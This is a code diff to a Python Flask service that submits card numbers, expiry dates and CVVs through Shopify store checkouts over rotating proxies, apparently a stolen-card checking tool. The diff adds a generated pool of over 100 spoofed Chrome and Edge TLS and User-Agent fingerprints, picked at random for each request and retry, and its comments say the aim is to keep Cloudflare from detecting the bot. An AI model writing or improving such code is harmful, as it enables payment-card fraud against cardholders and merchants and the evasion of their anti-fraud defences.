@@ -11,6 +11,112 @@ from flask import Flask, request, jsonify
 import os
 import time
 
+# ── Browser fingerprint rotation pool (100+ profiles) ─────────────
+# Generated at startup by combining TLS fingerprints × platform/OS
+# variations.  Every request picks a random profile so Cloudflare sees
+# many different "real browsers" instead of one repeated fingerprint.
+
+def _build_browser_profiles():
+    """Generate 100+ unique browser profiles from fingerprint × platform combos."""
+    profiles = []
+
+    # ── Chrome TLS fingerprints ──────────────────────────────────
+    # (curl_cffi name, full version string used in User-Agent)
+    _CHROME = [
+        ('chrome99',   '99.0.4844.51'),
+        ('chrome100',  '100.0.4896.75'),
+        ('chrome101',  '101.0.4951.67'),
+        ('chrome104',  '104.0.5112.79'),
+        ('chrome107',  '107.0.5304.107'),
+        ('chrome110',  '110.0.5481.77'),
+        ('chrome116',  '116.0.5845.96'),
+        ('chrome119',  '119.0.6045.105'),
+        ('chrome120',  '120.0.6099.109'),
+        ('chrome123',  '123.0.6312.58'),
+        ('chrome124',  '124.0.6367.118'),
+        ('chrome131',  '131.0.6778.85'),
+        ('chrome133a', '133.0.6943.53'),
+        ('chrome136',  '136.0.7103.92'),
+    ]
+
+    # OS strings that go inside the UA parentheses + matching sec-ch-ua-platform
+    _PLATFORMS = [
+        ('Windows NT 10.0; Win64; x64',        '"Windows"'),
+        ('Macintosh; Intel Mac OS X 10_15_7',   '"macOS"'),
+        ('X11; Linux x86_64',                   '"Linux"'),
+        ('Macintosh; Intel Mac OS X 10_14_6',   '"macOS"'),
+        ('Windows NT 10.0; WOW64',              '"Windows"'),
+        ('X11; Linux aarch64',                  '"Linux"'),
+    ]
+
+    # The "Not-A-Brand" token changed across Chrome versions
+    def _not_a_brand(major_int):
+        if major_int <= 109:  return '"Not A;Brand";v="99"'
+        if major_int <= 119:  return '"Not A(Brand";v="24"'
+        if major_int <= 123:  return '"Not_A Brand";v="8"'
+        return '"Not-A.Brand";v="99"'
+
+    # Chrome  ×  platform  → one profile each
+    for fp_name, ver in _CHROME:
+        major = ver.split('.')[0]
+        nab = _not_a_brand(int(major))
+        for os_str, plat in _PLATFORMS:
+            profiles.append({
+                'impersonate': fp_name,
+                'ua': f'Mozilla/5.0 ({os_str}) AppleWebKit/537.36 '
+                      f'(KHTML, like Gecko) Chrome/{ver} Safari/537.36',
+                'sec_ch_ua': f'"Chromium";v="{major}", '
+                             f'"Google Chrome";v="{major}", {nab}',
+                'sec_ch_ua_platform': plat,
+            })
+
+    # ── Edge TLS fingerprints ────────────────────────────────────
+    # (curl_cffi name, Edge version, underlying Chromium version, major)
+    _EDGE = [
+        ('edge99',  '99.0.1150.30',  '99.0.4844.51',  99),
+        ('edge101', '101.0.1210.47', '101.0.4951.64', 101),
+    ]
+    _EDGE_PLATFORMS = [
+        ('Windows NT 10.0; Win64; x64',        '"Windows"'),
+        ('Macintosh; Intel Mac OS X 10_15_7',   '"macOS"'),
+        ('Windows NT 10.0; WOW64',              '"Windows"'),
+    ]
+
+    for fp_name, edge_ver, chrome_ver, major in _EDGE:
+        nab = _not_a_brand(major)
+        for os_str, plat in _EDGE_PLATFORMS:
+            profiles.append({
+                'impersonate': fp_name,
+                'ua': f'Mozilla/5.0 ({os_str}) AppleWebKit/537.36 '
+                      f'(KHTML, like Gecko) Chrome/{chrome_ver} '
+                      f'Safari/537.36 Edg/{edge_ver}',
+                'sec_ch_ua': f'"Chromium";v="{major}", '
+                             f'"Microsoft Edge";v="{major}", {nab}',
+                'sec_ch_ua_platform': plat,
+            })
+
+    # ── Edge-UA on modern Chrome TLS (realistic: Edge IS Chromium) ──
+    for fp_name, ver in _CHROME[-5:]:      # last 5 Chrome fingerprints
+        major = ver.split('.')[0]
+        nab = _not_a_brand(int(major))
+        profiles.append({
+            'impersonate': fp_name,
+            'ua': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
+                  f'(KHTML, like Gecko) Chrome/{ver} Safari/537.36 Edg/{ver}',
+            'sec_ch_ua': f'"Chromium";v="{major}", '
+                         f'"Microsoft Edge";v="{major}", {nab}',
+            'sec_ch_ua_platform': '"Windows"',
+        })
+
+    random.shuffle(profiles)   # avoid sequential patterns
+    return profiles
+
+BROWSER_PROFILES = _build_browser_profiles()
+
+def pick_browser_profile():
+    """Return a random browser profile for fingerprint diversity."""
+    return random.choice(BROWSER_PROFILES)
+
 # ── Logging setup ───────────────────────────────────────────────────
 logging.basicConfig(
     level=logging.INFO,
@@ -169,7 +275,8 @@ async def fetch_products(domain, proxy_str=None):
         
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
-        async with AsyncSession(impersonate="chrome", verify=False, timeout=10) as session:
+        _fp = pick_browser_profile()
+        async with AsyncSession(impersonate=_fp['impersonate'], verify=False, timeout=10) as session:
             resp = await session.get(f"{domain}/products.json", proxy=proxy)
             if resp.status_code != 200:
                 return False, f"<b>Site Error! Status: {resp.status_code}</b>"
@@ -253,7 +360,7 @@ def extract_clean_response(message):
     
     return message[:50]
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, browser_profile=None):
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -265,17 +372,20 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     checkpoint_data = None
     running_total = "0.00"
 
+    # Use provided browser profile or pick a random one
+    bp = browser_profile or pick_browser_profile()
+
     try:
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            'User-Agent': bp['ua'],
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
             'Content-Type': 'application/json',
             'Origin': ourl,
             'Referer': ourl,
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua': bp['sec_ch_ua'],
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"'
+            'sec-ch-ua-platform': bp['sec_ch_ua_platform']
         }
 
         address_info = pick_addr(ourl)
@@ -297,7 +407,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
 
-        async with AsyncSession(impersonate="chrome", verify=False, timeout=45) as session:
+        async with AsyncSession(impersonate=bp['impersonate'], verify=False, timeout=90) as session:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
@@ -687,10 +797,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Origin': 'https://checkout.pci.shopifyinc.com',
                 'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                'User-Agent': bp['ua'],
+                'sec-ch-ua': bp['sec_ch_ua'],
                 'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform': bp['sec_ch_ua_platform'],
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
@@ -1081,8 +1191,10 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                 else:
                     current_proxy = None
                 
+                # Pick a fresh browser fingerprint for each attempt
+                bp = pick_browser_profile()
                 try:
-                    success, msg, gw, price, cur = await process_card(cc, mes, ano, cvv, site_url, variant_id, current_proxy)
+                    success, msg, gw, price, cur = await process_card(cc, mes, ano, cvv, site_url, variant_id, current_proxy, browser_profile=bp)
                     
                     # Check for transient errors that should be retried
                     error_msg_lower = str(msg).lower()
